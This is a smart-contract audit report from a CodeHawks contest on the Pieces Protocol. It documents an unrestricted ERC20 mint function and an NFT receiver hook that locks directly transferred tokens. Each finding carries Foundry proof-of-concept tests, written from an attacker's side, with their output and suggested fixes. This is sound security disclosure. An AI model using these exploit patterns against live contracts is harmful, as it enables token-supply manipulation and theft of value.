# Pieces Protocol - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. Unrestricted Token Minting in ERC20ToGenerateNftFraccion Allows Supply Manipulation](#H-01)
- ## Medium Risk Findings
  - ### [M-01. Unauthorized NFT Locking Through Direct Transfers](#M-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #32

### Dates: Jan 16th, 2025 - Jan 23rd, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-01-pieces-protocol)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 1
- Medium: 1
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. Unrestricted Token Minting in ERC20ToGenerateNftFraccion Allows Supply Manipulation

## Proof of Finding

https://codehawks.cyfrin.io/c/2025-01-pieces-protocol/s/31
<img width="848" alt="Image" src="https://github.com/user-attachments/assets/932f6529-f5ec-4c4e-9561-ae35142bf5a4" />

## Summary

The ERC20ToGenerateNftFraccion contract has a public mint function without access controls, allowing any user to mint arbitrary amounts of tokens. This is particularly severe as this token represents fractional NFT ownership.

## Vulnerability Details

The vulnerability exists in the ERC20ToGenerateNftFraccion contract where the mint function lacks access control:

```javascript
  function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
```

The mint function is declared as public without any access modifiers like onlyOwner, allowing any external account to call it and mint tokens at will.

## Impact

Critical. This vulnerability has several severe implications:

1. Any user can mint unlimited tokens to any address
2. Token supply can be manipulated at will
3. The entire NFT fractionalization system can be compromised since token amounts no longer accurately represent NFT ownership shares
4. Economic attacks possible through unlimited minting

## POC

- Copy this tests in path test/unit/ERC20ToGenerateNftFractionTest.t.sol

Two test cases demonstrate the vulnerability:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {ERC20ToGenerateNftFraccion} from "../../src/token/ERC20ToGenerateNftFraccion.sol";

contract ERC20ToGenerateNftFractionTest is Test {
    ERC20ToGenerateNftFraccion public token;
    address public constant ATTACKER = address(0x1);
    address public constant USER = address(0x2);
    uint256 public constant MINT_AMOUNT = 1000e18;

    function setUp() public {
        token = new ERC20ToGenerateNftFraccion("Test Token", "TEST");
    }

    function test_AccessControl_AnyoneCanMint() public {
        console.log("=== Demonstrating Unrestricted Minting Vulnerability ===");
        console.log("Initial attacker balance:", token.balanceOf(ATTACKER));
        console.log("Initial user balance:", token.balanceOf(USER));

        vm.startPrank(ATTACKER);
        console.log("\nAttacker address:", ATTACKER);
        console.log("Attacker attempting to mint", MINT_AMOUNT, "tokens...");

        // Attacker can mint tokens to themselves
        token.mint(ATTACKER, MINT_AMOUNT);
        console.log("Success! Attacker minted tokens to themselves");
        console.log("New attacker balance:", token.balanceOf(ATTACKER));

        // Attacker can mint tokens to other addresses
        console.log("\nAttacker now minting tokens to user address:", USER);
        token.mint(USER, MINT_AMOUNT);
        console.log("Success! Attacker minted tokens to another user");
        console.log("New user balance:", token.balanceOf(USER));

        vm.stopPrank();
        console.log("\nVulnerability demonstrated: Anyone can mint unlimited tokens!");
    }

    function test_VariableShadowing_NameAndSymbol() public {
        // Test that despite shadowing, name and symbol are set correctly
        assertEq(token.name(), "Test Token");
        assertEq(token.symbol(), "TEST");

        // Create another token with different parameters to ensure consistency
        ERC20ToGenerateNftFraccion newToken = new ERC20ToGenerateNftFraccion("Another Token", "AT");

        assertEq(newToken.name(), "Another Token");
        assertEq(newToken.symbol(), "AT");
    }

    function test_AccessControl_MintingCanBreakInvariants() public {
        console.log("=== Demonstrating Supply Manipulation Vulnerability ===");
        uint256 initialSupply = token.totalSupply();
        console.log("Initial total supply:", initialSupply);

        // Multiple parties can mint simultaneously
        vm.prank(ATTACKER);
        token.mint(ATTACKER, MINT_AMOUNT);
        console.log("\nAttacker minted:", MINT_AMOUNT);

        vm.prank(USER);
        token.mint(USER, MINT_AMOUNT);
        console.log("User minted:", MINT_AMOUNT);
        console.log("Current total supply:", token.totalSupply());

        // Calculate remaining supply before max
        uint256 remainingSupply = type(uint256).max - token.totalSupply();
        console.log("\nRemaining supply before max:", remainingSupply);

        // Show that anyone can mint unlimited amounts
        console.log("\nAttacker attempting to mint maximum possible tokens...");
        vm.prank(ATTACKER);
        token.mint(ATTACKER, remainingSupply);

        console.log("Success! Supply is now at maximum");
        console.log("Final total supply:", token.totalSupply());
        console.log("Attacker's final balance:", token.balanceOf(ATTACKER));
        console.log("\nVulnerability demonstrated: Supply can be maxed out by any user!");
    }
}

```

Output shows successful unauthorized minting:

```javascript
=== Demonstrating Unrestricted Minting Vulnerability ===
Initial attacker balance: 0
Initial user balance: 0

Attacker address: 0x0000000000000000000000000000000000000001
Attacker attempting to mint 1000000000000000000000 tokens...
Success! Attacker minted tokens to themselves
New attacker balance: 1000000000000000000000

Attacker now minting tokens to user address: 0x0000000000000000000000000000000000000002
Success! Attacker minted tokens to another user
New user balance: 1000000000000000000000
```

Output demonstrates complete supply manipulation:

```javascript
=== Demonstrating Supply Manipulation Vulnerability ===
Initial total supply: 0

Attacker minted: 1000000000000000000000
User minted: 1000000000000000000000
Current total supply: 2000000000000000000000

Final total supply: 115792089237316195423570985008687907853269984665640564039457584007913129639935
Attacker's final balance: 115792089237316195423570985008687907853269984665640564038457584007913129639935
```

The test outputs clearly show:

1. An attacker starting with 0 balance can mint arbitrary amounts
2. Tokens can be minted to any address
3. The total supply can be manipulated to reach maximum uint256 value
4. No transactions revert, indicating complete lack of access controls

## Tools Used

Manual review and foundry

## Recommendations

1. Implement two-step ownership transfer access control using OpenZeppelin's Ownable2Step:

```javascript
import "@openzeppelin/contracts/access/Ownable2Step.sol";

contract ERC20ToGenerateNftFraccion is ERC20, ERC20Burnable, Ownable2Step {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0), "Cannot mint to zero address");
        _mint(_to, _amount);
    }
}
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. Unauthorized NFT Locking Through Direct Transfers

## Proof of findings

https://codehawks.cyfrin.io/c/2025-01-pieces-protocol/s/34
<img width="872" alt="Image" src="https://github.com/user-attachments/assets/9a953918-105c-4c6f-9829-493c13fbb2d0" />

## Summary

The TokenDivider contract's onERC721Received implementation allows direct NFT transfers without proper initialization, leading to permanent NFT locking.

## Vulnerability Details

The contract accepts any NFT transfer through onERC721Received without validation:

```javascript
// In TokenDivider.sol
function onERC721Received(
    address, /* operator */
    address, /* from */
    uint256, /*  tokenId */
    bytes calldata /* data */
) external pure override returns (bytes4) {
    return this.onERC721Received.selector;
}
```

## Impact

Critical. This vulnerability allows:

- NFTs to be transferred directly to the contract
- No corresponding ERC20 tokens are minted
- NFTs become permanently locked
- Users can lose valuable NFTs through accidental transfers

## POC

```JavaScript
// test/unit/TokenDividerReceiveTest.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {TokenDivider} from "../../src/TokenDivider.sol";
import {ERC721Mock} from "../mocks/ERC721Mock.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TokenDividerReceiveTest is Test {
    TokenDivider public divider;
    ERC721Mock public legitimateNft;

    address public constant ATTACKER = address(0x2);
    uint256 public constant TOKEN_ID = 0;

    function setUp() public {
        divider = new TokenDivider();
        legitimateNft = new ERC721Mock();
        legitimateNft.mint(ATTACKER);
    }

    function test_UnauthorizedNFTTransfer() public {
        console.log("\n=== Testing Unauthorized NFT Transfer Vulnerability ===");
        console.log("Contract's onERC721Received function accepts any NFT without validation");

        vm.startPrank(ATTACKER);

        console.log("\nAttempting to transfer NFT without using divideNft function...");
        console.log("Initial NFT owner:", legitimateNft.ownerOf(TOKEN_ID));
        console.log("Target contract:", address(divider));

        // Direct transfer bypassing divideNft
        legitimateNft.safeTransferFrom(ATTACKER, address(divider), TOKEN_ID, "");

        console.log("\nVULNERABILITY: NFT transfer succeeded without proper initialization!");
        console.log("New NFT owner:", legitimateNft.ownerOf(TOKEN_ID));
        console.log("No ERC20 tokens were minted");
        console.log("NFT is now locked in contract without corresponding ERC20 tokens");

        vm.stopPrank();
    }
}
```

- Run `forge test --mc TokenDividerReceiveTest -vvv`

Output:

```javascript
=== Testing Unauthorized NFT Transfer Vulnerability ===
Contract's onERC721Received function accepts any NFT without validation

Attempting to transfer NFT without using divideNft function...
Initial NFT owner: 0x0000000000000000000000000000000000000002
Target contract: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f

VULNERABILITY: NFT transfer succeeded without proper initialization!
New NFT owner: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
No ERC20 tokens were minted
NFT is now locked in contract without corresponding ERC20 tokens
```

## Tools Used

- Foundry

## Recommendations

1\. Add transfer validation in onERC721Received

```solidity
bool private _isProcessingDivide;

modifier onlyDuringDivide() {
    require(_isProcessingDivide, "Only accept transfers through divideNft");
    _;
}

function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
) external override onlyDuringDivide returns (bytes4) {
    return this.onERC721Received.selector;
}

function divideNft(address nftAddress, uint256 tokenId, uint256 amount) external {
    _isProcessingDivide = true;
    // ... existing code ...
    _isProcessingDivide = false;
}
```
